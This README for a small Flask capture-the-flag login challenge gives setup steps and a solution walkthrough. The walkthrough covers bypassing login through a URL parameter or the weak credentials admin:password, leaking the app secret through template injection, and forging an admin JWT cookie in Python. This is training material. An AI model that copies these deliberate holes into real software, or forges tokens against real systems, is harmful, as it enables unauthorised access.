# LoginChallenge2022
Mini CTF challenge for the September 2022 Activity Fair

## Install + Setup

### Install Flask

**Windows**

Install Python:

https://www.python.org/downloads/release/python-397/

Set PATH:
- Start > Edit Environment Variables
- Add Python install directory to both System and Environment variables

Check python installed:

```
PS > python --version
```

Install flask and other dependencies:

```
PS > python -m pip install -r requirements.txt
```

**Linux**

```
$ python3 -m pip install -r requirements.txt
```

## Run

### Windows

```
PS > cd .\web\
PS > $env:FLASK_APP = "app"
PS > $env:FLASK_DEBUG = "true"
PS > python -m flask run
```

## Solution

### Part 1

Change the `http://localhost:5000/?loginSuccessful=False` parameter to `True`

OR

Guess the weak credentials `admin`:`password`

### Part 2

Leak app secret with SSTI

THEN

Inspect the JWT to see `is_admin` parameter and forge a new cookie

```
$ python
>>> import jwt
>>> token = 'eyJ0....K3FA'
>>> secret = ';nod87b;/dfub6vaz.knib'
>>> jwt.decode(token, secret, "HS256") 
{'fresh': False, 'iat': 1663444862, 'jti': '6b0f4003-7579-41cc-bc30-c0fb9c4e3ef3', 'type': 'access', 'sub': {'is_admin': False}, 'nbf': 1663444862, 'csrf': 'fbcf88b6-684e-42e7-8d7d-1de3fd65b58e', 'exp': 1663445762}
>>> j = jwt.decode(token, secret, "HS256") 
>>> j['sub'] = {'is_admin': True}
>>> jwt.encode(j, secret)
'eyJ0...ncRo'
```

Replace the `access_token_cookie` with this new value and reload the page